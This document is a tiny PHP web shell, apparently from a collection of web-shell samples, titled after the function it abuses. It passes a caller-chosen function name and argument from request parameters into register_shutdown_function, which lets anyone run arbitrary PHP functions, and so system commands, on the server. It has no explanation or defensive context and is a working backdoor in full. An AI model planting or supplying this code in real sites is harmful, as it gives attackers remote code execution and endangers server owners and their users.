register_shutdown_function
<?php
$e = $_REQUEST['e'];
register_shutdown_function($e, $_REQUEST['pass']);
?>
